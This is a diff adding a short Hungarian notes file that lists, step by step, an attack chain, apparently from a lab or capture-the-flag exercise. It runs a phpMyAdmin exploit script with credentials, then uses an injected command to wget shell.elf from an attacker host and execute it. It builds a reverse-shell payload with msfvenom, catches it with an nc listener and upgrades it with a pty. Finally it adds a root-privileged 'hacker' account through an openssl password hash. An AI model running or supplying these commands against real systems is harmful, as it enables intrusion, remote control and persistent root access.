@@ -1,0 +1,24 @@
+parncsok:
+
+ablak I.
+  letolteni a scriptet és be cd-zni a Downloadsba (példa a script 50457.py)
+  python3 50457.py 40.0.5.18 80 /phpmyadmin pma pmapass    
+  COPY: "cd /tmp; rm -f / tmp/shell.elf; wget http://[...30.0.2.19...]:8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf"
+      ->  "cd /tmp; rm -f / tmp/shell.elf; wget http://   :8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf"
+ablak II.
+  msfvenom -p linux/64x/shell_reverse_tcp LHOST=[...30.0.2.19...]  LPORT=4444 -f elf >shell.elf
+  -> msfvenom -p linux/64x/shell_reverse_tcp LHOST= LPORT=4444 -f elf >shell.elf
+
+  python3 -m http.server
+
+  ablak III.
+    nc -lvp 4444
+
+    python3 -c "import pty;pty.spawn('/bin/bash')"
+
+Jelszo hash/hack:
+JELSZO eleszitese
+openssl passwd -5 alma
+
+hacker:JELSZO:0:0::/root:/bin/bash
+hacker nevű, root jogú, alma jelszava
